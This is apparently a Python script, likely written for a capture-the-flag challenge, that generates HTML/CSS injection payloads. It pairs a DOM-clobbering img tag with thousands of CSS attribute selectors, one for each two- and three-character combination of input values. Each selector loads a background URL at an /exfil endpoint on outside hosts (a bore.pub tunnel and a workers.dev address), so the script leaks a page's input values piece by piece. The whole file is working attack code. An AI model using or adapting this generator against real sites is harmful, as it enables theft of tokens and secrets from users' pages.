import string
import itertools as it
from urllib.parse import quote
import time
import random as rng
from base64 import b64encode
import json
from pathlib import Path
import shutil as sh
from contextlib import suppress
from multiprocessing import Pool

escape_map = json.loads(r"""
{"0":"\\30 ","1":"\\31 ","2":"\\32 ","3":"\\33 ","4":"\\34 ","5":"\\35 ","6":"\\36 ","7":"\\37 ","8":"\\38 ","9":"\\39 ","a":"a","b":"b","c":"c","d":"d","e":"e","f":"f","g":"g","h":"h","i":"i","j":"j","k":"k","l":"l","m":"m","n":"n","o":"o","p":"p","q":"q","r":"r","s":"s","t":"t","u":"u","v":"v","w":"w","x":"x","y":"y","z":"z","A":"A","B":"B","C":"C","D":"D","E":"E","F":"F","G":"G","H":"H","I":"I","J":"J","K":"K","L":"L","M":"M","N":"N","O":"O","P":"P","Q":"Q","R":"R","S":"S","T":"T","U":"U","V":"V","W":"W","X":"X","Y":"Y","Z":"Z","!":"\\!","\"":"\\\"","#":"\\#","$":"\\$","%":"\\%","&":"\\&","'":"\\'","(":"\\(",")":"\\)","*":"\\*","+":"\\+",",":"\\,","-":"\\-",".":"\\.","/":"\\/",":":"\\:",";":"\\;","<":"\\<","=":"\\=",">":"\\>","?":"\\?","@":"\\@","[":"\\[","\\":"\\\\","]":"\\]","^":"\\^","_":"_","`":"\\`","{":"\\{","|":"\\|","}":"\\}","~":"\\~"," ":"\\ ","\t":"\\9 ","\n":"\\a ","\r":"\\d ","\u000b":"\\b ","\f":"\\c "}
""")

remote_url = "http://0.0.0.0:8000"
remote_url = "http://bore.pub:38967"
remote_url = "https://qs.ronak-badhe.workers.dev"


def gen_one(s):
    s = str(s)
    html = ["""
    <img name="querySelectorAll" />
    <style>
    """]

    urls = []

    rep = lambda c: b64encode(c.encode()).decode().rstrip("=").replace("/", "_").replace("+", "-")
    attrquote = lambda c: "".join(escape_map[cc] for cc in c)
    threealphabet = string.ascii_lowercase + string.digits
    twoalphabet = string.ascii_letters + string.digits
    for i in threealphabet:
        for j in threealphabet:
            for k in threealphabet:
                combo = i + j + k
                html.append(f"""
    [value*="{attrquote(combo)}" i] {{
        --c-{rep(combo)}: url({remote_url}/exfil?r={s}&c={quote(combo)});
    }}
                """)
                urls.append(f"var(--c-{rep(combo)}, none)")

    for i in twoalphabet:
        for j in twoalphabet:
            combo = i + j
            html.append(f"""
    [value^="{attrquote(combo)}"] {{
        --s-{rep(combo)}: url({remote_url}/exfil?r={s}&s={quote(combo)});
    }}
    [value*="{attrquote(combo)}"] {{
        --c-{rep(combo)}: url({remote_url}/exfil?r={s}&c={quote(combo)});
    }}
            """)
            urls.append(f"var(--s-{rep(combo)}, none)")
            urls.append(f"var(--c-{rep(combo)}, none)")


    html.append(f"""
    input[value] {{
        background: {','.join(urls)};
    }}
    """)
    # print(html[-1])
    html.append("</style>")
    payload = "".join(html).replace("\n", "").replace("  ", "")
    return payload

payload_dir = Path(__file__).parent / "payload"
with suppress(Exception):
    sh.rmtree(payload_dir)
payload_dir.mkdir(exist_ok=True)

def work(i):
    (payload_dir / f"{i}.html").write_text(gen_one(i))

with Pool(10) as pool:
    pool.map(work, range(100))
